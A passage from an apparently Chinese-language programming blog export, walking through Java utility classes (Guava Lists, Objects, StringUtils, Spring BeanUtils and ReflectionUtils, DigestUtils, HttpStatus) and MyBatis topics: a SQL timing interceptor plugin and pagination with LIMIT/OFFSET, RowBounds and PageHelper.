<h3 id="3-4-流处理"><a href="#3-4-流处理" class="headerlink" title="3.4 流处理"></a>3.4 流处理</h3><p>如果我们想对集合内的元素进行操作，可以使用 Lists 的 transform 方法。例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;String&gt; list = Lists.newArrayList(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>);</span><br><span class="line">List&lt;String&gt; transformList = Lists.transform(list, x -&gt; x.toUpperCase());</span><br><span class="line">System.out.println(transformList);</span><br></pre></td></tr></table></figure>
<p>小写字母被转换为大写字母。 执行结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[A, B, C]</span><br></pre></td></tr></table></figure>

<h3 id="3-5-反转顺序"><a href="#3-5-反转顺序" class="headerlink" title="3.5 反转顺序"></a>3.5 反转顺序</h3><p>Lists 有一个 reverse() 方法用于反转顺序。例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;Integer&gt; list = Lists.newArrayList(<span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">4</span>);</span><br><span class="line">List&lt;Integer&gt; reverseList = Lists.reverse(list);</span><br><span class="line">System.out.println(reverseList);</span><br></pre></td></tr></table></figure>
<p>执行结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[4, 5, 2, 1, 3]</span><br></pre></td></tr></table></figure>

<h2 id="4-Objects"><a href="#4-Objects" class="headerlink" title="4. Objects"></a>4. Objects</h2><p>在 jdk7 之后，提供了 Objects 工具类，我们可以通过它对对象进行操作。</p>
<h3 id="4-1-检查对象是否为空"><a href="#4-1-检查对象是否为空" class="headerlink" title="4.1 检查对象是否为空"></a>4.1 检查对象是否为空</h3><p>在 Java 中，一切皆对象。检查对象是否为空可以说是无处不在。Objects 的 isNull 方法检查对象是否为空，nonNull 方法检查对象是否不为空。例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Integer</span> <span class="variable">i</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="number">10</span>);</span><br><span class="line"><span class="keyword">if</span> (Objects.isNull(i)) &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;Object is null&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (Objects.nonNull(i)) &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;Object is not null&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="4-2-对象为空时抛出异常"><a href="#4-2-对象为空时抛出异常" class="headerlink" title="4.2 对象为空时抛出异常"></a>4.2 对象为空时抛出异常</h3><p>如果我们想在对象为空时抛出空指针异常，可以使用 Objects 的 requireNonNull 方法。例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Integer</span> <span class="variable">i</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="number">128</span>);</span><br><span class="line">Objects.requireNonNull(i);</span><br><span class="line">Objects.requireNonNull(i, <span class="string">&quot;Parameters cannot be null&quot;</span>);</span><br><span class="line">Objects.requireNonNull(i, () -&gt; <span class="string">&quot;Parameters cannot be null&quot;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="4-3-检查两个对象是否相等"><a href="#4-3-检查两个对象是否相等" class="headerlink" title="4.3 检查两个对象是否相等"></a>4.3 检查两个对象是否相等</h3><p>我们经常需要检查两个对象是否相等。Objects 为我们提供了 equals 方法，可以很方便地实现：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Integer</span> <span class="variable">i1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="number">1</span>);</span><br><span class="line"><span class="type">Integer</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="number">1</span>);</span><br><span class="line">System.out.println(Objects.equals(i1, i2));</span><br></pre></td></tr></table></figure>
<p>执行结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">true</span><br></pre></td></tr></table></figure>
<p>但是使用这个方法时有一个坑。例如，如果将例子改为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Integer</span> <span class="variable">i</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="number">1</span>);</span><br><span class="line"><span class="type">Long</span> <span class="variable">l</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Long</span>(<span class="number">1</span>);</span><br><span class="line">System.out.println(Objects.equals(i, l));</span><br></pre></td></tr></table></figure>
<p>执行结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">false</span><br></pre></td></tr></table></figure>

<h3 id="4-4-获取对象的哈希码"><a href="#4-4-获取对象的哈希码" class="headerlink" title="4.4 获取对象的哈希码"></a>4.4 获取对象的哈希码</h3><p>如果你想获取某个对象的哈希码，可以使用 Objects 的 hashCode 方法。例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;abc&quot;</span>);</span><br><span class="line">System.out.println(Objects.hashCode(str));</span><br></pre></td></tr></table></figure>
<p>执行结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">96354</span><br></pre></td></tr></table></figure>

<h2 id="5-StringUtils"><a href="#5-StringUtils" class="headerlink" title="5. StringUtils"></a>5. StringUtils</h2><p>字符串在我们的日常工作中使用得非常频繁。在我们的代码中，经常需要检查字符串是否为空、转换大小写、分割字符串、比较字符串、去除多余空格、连接字符串、使用正则表达式等等。 如果我们只使用 String 类提供的方法，就需要手动编写大量额外的代码，既耗时又费力。作为程序员，当然要学会偷懒。现在有一个现成的工具类，即 org.apache.commons.lang3 包下的 StringUtils 工具类，它为我们提供了非常多操作 String 的方法。</p>
<h3 id="5-1-检查字符串是否为空"><a href="#5-1-检查字符串是否为空" class="headerlink" title="5.1 检查字符串是否为空"></a>5.1 检查字符串是否为空</h3><p>实际上，对于空字符串，不仅有 null，还有“”、“ ”、“null”等多种情况。StringUtils 为我们提供了多个静态方法来检查字符串是否为空。例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">str1</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">str2</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">str3</span> <span class="operator">=</span> <span class="string">&quot; &quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">str4</span> <span class="operator">=</span> <span class="string">&quot;abc&quot;</span>;</span><br><span class="line">System.out.println(StringUtils.isEmpty(str1));</span><br><span class="line">System.out.println(StringUtils.isEmpty(str2));</span><br><span class="line">System.out.println(StringUtils.isEmpty(str3));</span><br><span class="line">System.out.println(StringUtils.isEmpty(str4));</span><br><span class="line">System.out.println(<span class="string">&quot;-------------------------------------&quot;</span>);</span><br><span class="line">System.out.println(StringUtils.isNotEmpty(str1));</span><br><span class="line">System.out.println(StringUtils.isNotEmpty(str2));</span><br><span class="line">System.out.println(StringUtils.isNotEmpty(str3));</span><br><span class="line">System.out.println(StringUtils.isNotEmpty(str4));</span><br><span class="line">System.out.println(<span class="string">&quot;-------------------------------------&quot;</span>);</span><br><span class="line">System.out.println(StringUtils.isBlank(str1));</span><br><span class="line">System.out.println(StringUtils.isBlank(str2));</span><br><span class="line">System.out.println(StringUtils.isBlank(str3));</span><br><span class="line">System.out.println(StringUtils.isBlank(str4));</span><br><span class="line">System.out.println(<span class="string">&quot;-------------------------------------&quot;</span>);</span><br><span class="line">System.out.println(StringUtils.isNotBlank(str1));</span><br><span class="line">System.out.println(StringUtils.isNotBlank(str2));</span><br><span class="line">System.out.println(StringUtils.isNotBlank(str3));</span><br><span class="line">System.out.println(StringUtils.isNotBlank(str4));</span><br></pre></td></tr></table></figure>
<p>输出：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">true</span><br><span class="line">true</span><br><span class="line">false</span><br><span class="line">false</span><br><span class="line">false</span><br><span class="line">false</span><br><span class="line">true</span><br><span class="line">true</span><br><span class="line">true</span><br><span class="line">true</span><br><span class="line">true</span><br><span class="line">false</span><br><span class="line">false</span><br><span class="line">false</span><br><span class="line">false</span><br><span class="line">true</span><br></pre></td></tr></table></figure>
<p>示例中的四个空检查方法：isEmpty、isNotEmpty、isBlank 和 isNotBlank。你可以根据实际情况使用这些方法。 建议优先使用 isBlank 和 isNotBlank 方法，因为它们会考虑更多情况。</p>
<h3 id="5-2-分割字符串"><a href="#5-2-分割字符串" class="headerlink" title="5.2 分割字符串"></a>5.2 分割字符串</h3><p>分割字符串是一个常见需求。如果直接使用 String 类的 split 方法，可能会出现空指针异常。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">str1</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">System.out.println(StringUtils.split(str1, <span class="string">&quot;,&quot;</span>));</span><br><span class="line">System.out.println(str1.split(<span class="string">&quot;,&quot;</span>));</span><br></pre></td></tr></table></figure>
<p>使用 StringUtils 的 split 方法会返回 null，而使用 String 的 split 方法会报指针异常。</p>
<h3 id="5-3-检查是否为纯数字"><a href="#5-3-检查是否为纯数字" class="headerlink" title="5.3 检查是否为纯数字"></a>5.3 检查是否为纯数字</h3><p>给定一个字符串，要检查它是否为纯数字，可以使用 isNumeric 方法。例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">str1</span> <span class="operator">=</span> <span class="string">&quot;123&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">str2</span> <span class="operator">=</span> <span class="string">&quot;123abc&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">str3</span> <span class="operator">=</span> <span class="string">&quot;0.33&quot;</span>;</span><br><span class="line">System.out.println(StringUtils.isNumeric(str1));</span><br><span class="line">System.out.println(StringUtils.isNumeric(str2));</span><br><span class="line">System.out.println(StringUtils.isNumeric(str3));</span><br></pre></td></tr></table></figure>
<p>输出：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">true</span><br><span class="line">false</span><br><span class="line">false</span><br></pre></td></tr></table></figure>

<h3 id="5-4-将集合连接成字符串"><a href="#5-4-将集合连接成字符串" class="headerlink" title="5.4 将集合连接成字符串"></a>5.4 将集合连接成字符串</h3><p>有时，我们需要将集合的内容连接成一个字符串然后输出，这时可以使用 join 方法。例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;String&gt; list = Lists.newArrayList(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>);</span><br><span class="line">List&lt;Integer&gt; list2 = Lists.newArrayList(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">System.out.println(StringUtils.join(list, <span class="string">&quot;,&quot;</span>));</span><br><span class="line">System.out.println(StringUtils.join(list2, <span class="string">&quot; &quot;</span>));</span><br></pre></td></tr></table></figure>
<p>输出：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a,b,c</span><br><span class="line">1 2 3</span><br></pre></td></tr></table></figure>

<h2 id="6-BeanUtils"><a href="#6-BeanUtils" class="headerlink" title="6. BeanUtils"></a>6. BeanUtils</h2><p>Spring 为我们提供了一个用于 JavaBean 的工具类，它在 org.springframework.beans 包下，名字是：BeanUtils。</p>
<h3 id="6-1-复制对象属性"><a href="#6-1-复制对象属性" class="headerlink" title="6.1 复制对象属性"></a>6.1 复制对象属性</h3><p>你是否遇到过这样的需求：将某个对象的所有属性复制到另一个对象。这时可以使用 BeanUtils 的 copyProperties 方法。例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">User</span> <span class="variable">user1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">user1.setId(<span class="number">1L</span>);</span><br><span class="line">user1.setName(<span class="string">&quot;Dylan&quot;</span>);</span><br><span class="line">user1.setAddress(<span class="string">&quot;Hong Kong&quot;</span>);</span><br><span class="line"><span class="type">User</span> <span class="variable">user2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">BeanUtils.copyProperties(user1, user2);</span><br><span class="line">System.out.println(user2);</span><br></pre></td></tr></table></figure>

<h3 id="6-2-获取指定类的指定方法"><a href="#6-2-获取指定类的指定方法" class="headerlink" title="6.2 获取指定类的指定方法"></a>6.2 获取指定类的指定方法</h3><p>如果你想获取某个类的指定方法以便后续操作，可以使用 BeanUtils 的 findDeclaredMethod 方法。例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">declaredMethod</span> <span class="operator">=</span> BeanUtils.findDeclaredMethod(User.class, <span class="string">&quot;getId&quot;</span>);</span><br><span class="line">System.out.println(declaredMethod.getName());</span><br></pre></td></tr></table></figure>

<h3 id="6-3-获取指定方法的参数"><a href="#6-3-获取指定方法的参数" class="headerlink" title="6.3 获取指定方法的参数"></a>6.3 获取指定方法的参数</h3><p>如果你想获取某个方法的参数，可以使用 BeanUtils 的 findPropertyForMethod 方法。例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">declaredMethod</span> <span class="operator">=</span> BeanUtils.findDeclaredMethod(User.class, <span class="string">&quot;getId&quot;</span>);</span><br><span class="line"><span class="type">PropertyDescriptor</span> <span class="variable">propertyForMethod</span> <span class="operator">=</span> BeanUtils.findPropertyForMethod(declaredMethod);</span><br><span class="line">System.out.println(propertyForMethod.getName());</span><br></pre></td></tr></table></figure>

<h2 id="7-ReflectionUtils"><a href="#7-ReflectionUtils" class="headerlink" title="7. ReflectionUtils"></a>7. ReflectionUtils</h2><p>有时，我们在项目中需要使用反射功能。如果使用最原始的方法开发，代码量会非常大且麻烦，需要处理大量异常和访问权限问题。 好消息是，Spring 为我们提供了一个 ReflectionUtils 工具类，它在 org.springframework.util 包下。</p>
<h3 id="7-1-获取方法"><a href="#7-1-获取方法" class="headerlink" title="7.1 获取方法"></a>7.1 获取方法</h3><p>如果你想获取某个类的某个方法，可以使用 ReflectionUtils 类的 findMethod 方法。例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> ReflectionUtils.findMethod(User.class, <span class="string">&quot;getId&quot;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="7-2-获取字段"><a href="#7-2-获取字段" class="headerlink" title="7.2 获取字段"></a>7.2 获取字段</h3><p>如果你想获取某个类的某个字段，可以使用 ReflectionUtils 类的 findField 方法。例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> ReflectionUtils.findField(User.class, <span class="string">&quot;id&quot;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="7-3-执行方法"><a href="#7-3-执行方法" class="headerlink" title="7.3 执行方法"></a>7.3 执行方法</h3><p>如果你想通过反射调用某个方法并传递参数，可以使用 ReflectionUtils 类的 invokeMethod 方法。例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ReflectionUtils.invokeMethod(method, springContextsUtil.getBean(beanName), param);</span><br></pre></td></tr></table></figure>

<h3 id="7-4-检查字段是否为常量"><a href="#7-4-检查字段是否为常量" class="headerlink" title="7.4 检查字段是否为常量"></a>7.4 检查字段是否为常量</h3><p>如果你想检查某个字段是否为常量，可以使用 ReflectionUtils 类的 isPublicStaticFinal 方法。例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> ReflectionUtils.findField(User.class, <span class="string">&quot;id&quot;</span>);</span><br><span class="line">System.out.println(ReflectionUtils.isPublicStaticFinal(field));</span><br></pre></td></tr></table></figure>

<h3 id="7-5-检查是否为-equals-方法"><a href="#7-5-检查是否为-equals-方法" class="headerlink" title="7.5 检查是否为 equals 方法"></a>7.5 检查是否为 equals 方法</h3><p>如果你想检查某个方法是否为 equals 方法，可以使用 ReflectionUtils 类的 isEqualsMethod 方法。例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> ReflectionUtils.findMethod(User.class, <span class="string">&quot;getId&quot;</span>);</span><br><span class="line">System.out.println(ReflectionUtils.isEqualsMethod(method));</span><br></pre></td></tr></table></figure>

<h2 id="8-DigestUtils"><a href="#8-DigestUtils" class="headerlink" title="8. DigestUtils"></a>8. DigestUtils</h2><p>有时，我们需要对数据进行加密，比如使用 md5 或 sha256。我们可以使用 Apache 的org.apache.commons.codec.digest 包下的 DigestUtils 类。</p>
<h3 id="8-1-MD5-加密"><a href="#8-1-MD5-加密" class="headerlink" title="8.1 MD5 加密"></a>8.1 MD5 加密</h3><p>如果你想使用 MD5 加密数据，可以使用 DigestUtils 的 md5Hex 方法。例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">md5Hex</span> <span class="operator">=</span> DigestUtils.md5Hex(<span class="string">&quot;Dylan&quot;</span>);</span><br><span class="line">System.out.println(md5Hex);</span><br></pre></td></tr></table></figure>

<h3 id="8-2-SHA256-加密"><a href="#8-2-SHA256-加密" class="headerlink" title="8.2 SHA256 加密"></a>8.2 SHA256 加密</h3><p>如果你想使用 SHA256 加密数据，可以使用 DigestUtils 的 sha256Hex 方法。例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">md5Hex</span> <span class="operator">=</span> DigestUtils.sha256Hex(<span class="string">&quot;Dylan&quot;</span>);</span><br><span class="line">System.out.println(md5Hex);</span><br></pre></td></tr></table></figure>

<h2 id="9-HttpStatus"><a href="#9-HttpStatus" class="headerlink" title="9. HttpStatus"></a>9. HttpStatus</h2><p>很多时候，我们会在代码中定义 HTTP 返回码。例如，正常接口返回 200，异常返回 500，如果接口找不到则返回 404。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">int</span> <span class="variable">SUCCESS_CODE</span> <span class="operator">=</span> <span class="number">200</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span> <span class="variable">ERROR_CODE</span> <span class="operator">=</span> <span class="number">500</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span> <span class="variable">NOT_FOUND_CODE</span> <span class="operator">=</span> <span class="number">404</span>;</span><br></pre></td></tr></table></figure>
<p>实际上，org.springframework.http 包下的 HttpStatus 枚举或 org.apache.http 包下的 HttpStatus 接口已经为我们定义了常用的 HTTP 返回码，我们可以直接使用，真的不需要重新定义</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Mybatis功能一【设置自定义插件】</title>
    <url>/cnblogs.github.io/p/52094.html</url>
    <content><![CDATA[<p>假设我们想做一个插件，用于统计每个 SQL 查询的执行时间。这听起来是不是很酷？下面就是实现这个功能的具体步骤。</p>
<h4 id="第一步：实现-Interceptor-接口"><a href="#第一步：实现-Interceptor-接口" class="headerlink" title="第一步：实现 Interceptor 接口"></a>第一步：实现 Interceptor 接口</h4><p>MyBatis 插件的核心在于实现org.apache.ibatis.plugin.Interceptor 接口。这个接口只有一个方法需要重写：intercept(Invocation invocation)。我们可以通过这个方法插入自定义逻辑。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.ibatis.executor.statement.StatementHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.plugin.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.session.ResultHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Intercepts(&#123;</span></span><br><span class="line"><span class="meta">    @Signature(type = StatementHandler.class, method = &quot;query&quot;, args = &#123;java.sql.Statement.class, ResultHandler.class&#125;),</span></span><br><span class="line"><span class="meta">    @Signature(type = StatementHandler.class, method = &quot;update&quot;, args = &#123;java.sql.Statement.class&#125;)</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TimeStatInterceptor</span> <span class="keyword">implements</span> <span class="title class_">Interceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">intercept</span><span class="params">(Invocation invocation)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="type">long</span> <span class="variable">start</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> invocation.proceed(); <span class="comment">// 调用原始方法</span></span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="type">long</span> <span class="variable">end</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">            System.out.println(<span class="string">&quot;SQL Execution Time: &quot;</span> + (end - start) + <span class="string">&quot; ms&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">plugin</span><span class="params">(Object target)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Plugin.wrap(target, <span class="built_in">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setProperties</span><span class="params">(Properties properties)</span> &#123;</span><br><span class="line">        <span class="comment">// 可以在这里设置插件属性</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="第二步：配置插件"><a href="#第二步：配置插件" class="headerlink" title="第二步：配置插件"></a>第二步：配置插件</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugin</span> <span class="attr">interceptor</span>=<span class="string">&quot;com.example.TimeStatInterceptor&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Mybatis</category>
      </categories>
      <tags>
        <tag>Mybatis</tag>
      </tags>
  </entry>
  <entry>
    <title>Mybatis功能三【分页查询】</title>
    <url>/cnblogs.github.io/p/5483.html</url>
    <content><![CDATA[<h2 id="1-原生-MyBatis-分页（手动参数传递）"><a href="#1-原生-MyBatis-分页（手动参数传递）" class="headerlink" title="1. 原生 MyBatis 分页（手动参数传递）"></a>1. 原生 MyBatis 分页（手动参数传递）</h2><p>通过 SQL 的LIMIT和OFFSET（或数据库方言如 Oracle 的ROWNUM）手动分页。<br>实现步骤：</p>
<h3 id="1-1、实体类定义："><a href="#1-1、实体类定义：" class="headerlink" title="1.1、实体类定义："></a>1.1、实体类定义：</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PageParam</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> pageNum;    <span class="comment">// 当前页码</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> pageSize;   <span class="comment">// 每页数量</span></span><br><span class="line">    <span class="comment">// Getters &amp; Setters</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="1-2、Mapper-XML："><a href="#1-2、Mapper-XML：" class="headerlink" title="1.2、Mapper XML："></a>1.2、Mapper XML：</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;selectUsersByPage&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;User&quot;</span>&gt;</span></span><br><span class="line">    SELECT * FROM user </span><br><span class="line">    LIMIT #&#123;pageSize&#125; OFFSET #&#123;offset&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="1-3、Mapper-接口："><a href="#1-3、Mapper-接口：" class="headerlink" title="1.3、Mapper 接口："></a>1.3、Mapper 接口：</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserMapper</span> &#123;</span><br><span class="line">    List&lt;User&gt; <span class="title function_">selectUsersByPage</span><span class="params">(<span class="meta">@Param(&quot;pageSize&quot;)</span> <span class="type">int</span> pageSize, <span class="meta">@Param(&quot;offset&quot;)</span> <span class="type">int</span> offset)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="1-4、调用代码："><a href="#1-4、调用代码：" class="headerlink" title="1.4、调用代码："></a>1.4、调用代码：</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">pageNum</span> <span class="operator">=</span> <span class="number">2</span>;  <span class="comment">// 第2页</span></span><br><span class="line"><span class="type">int</span> <span class="variable">pageSize</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">offset</span> <span class="operator">=</span> (pageNum - <span class="number">1</span>) * pageSize;  <span class="comment">// 计算偏移量</span></span><br><span class="line">List&lt;User&gt; users = userMapper.selectUsersByPage(pageSize, offset);</span><br></pre></td></tr></table></figure>
<p><strong>特点：</strong><br>优点：简单直接，无需第三方依赖。<br>缺点：需手动计算偏移量，不同数据库需调整 SQL 方言（如 Oracle 用ROWNUM）</p>
<h2 id="2-使用RowBounds（逻辑分页）"><a href="#2-使用RowBounds（逻辑分页）" class="headerlink" title="2. 使用RowBounds（逻辑分页）"></a>2. 使用RowBounds（逻辑分页）</h2><p>通过 MyBatis 内置的RowBounds对象实现逻辑分页（内存分页）。<br>实现步骤：</p>
<h3 id="2-1-Mapper-接口："><a href="#2-1-Mapper-接口：" class="headerlink" title="2.1 Mapper 接口："></a>2.1 Mapper 接口：</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;User&gt; <span class="title function_">selectAllUsers</span><span class="params">(RowBounds rowBounds)</span>;</span><br></pre></td></tr></table></figure>
<h3 id="2-2-XML-SQL："><a href="#2-2-XML-SQL：" class="headerlink" title="2.2 XML SQL："></a>2.2 XML SQL：</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;selectAllUsers&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;User&quot;</span>&gt;</span></span><br><span class="line">    SELECT * FROM user</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="2-3-调用代码："><a href="#2-3-调用代码：" class="headerlink" title="2.3 调用代码："></a>2.3 调用代码：</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">pageNum</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">pageSize</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line"><span class="type">RowBounds</span> <span class="variable">rowBounds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RowBounds</span>((pageNum - <span class="number">1</span>) * pageSize, pageSize);</span><br><span class="line">List&lt;User&gt; users = userMapper.selectAllUsers(rowBounds);</span><br></pre></td></tr></table></figure>
<p><strong>特点：</strong><br>优点：代码简单，统一分页方式。<br>缺点：本质是内存分页（先查询全部数据，再截取片段），大数据量时性能差。</p>
<h2 id="3-使用分页插件（推荐：PageHelper）"><a href="#3-使用分页插件（推荐：PageHelper）" class="headerlink" title="3. 使用分页插件（推荐：PageHelper）"></a>3. 使用分页插件（推荐：PageHelper）</h2><p>通过第三方插件（如 PageHelper）实现物理分页，自动改写 SQL。<br>实现步骤：</p>
<h3 id="3-1-添加依赖："><a href="#3-1-添加依赖：" class="headerlink" title="3.1 添加依赖："></a>3.1 添加依赖：</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.github.pagehelper<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>pagehelper<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
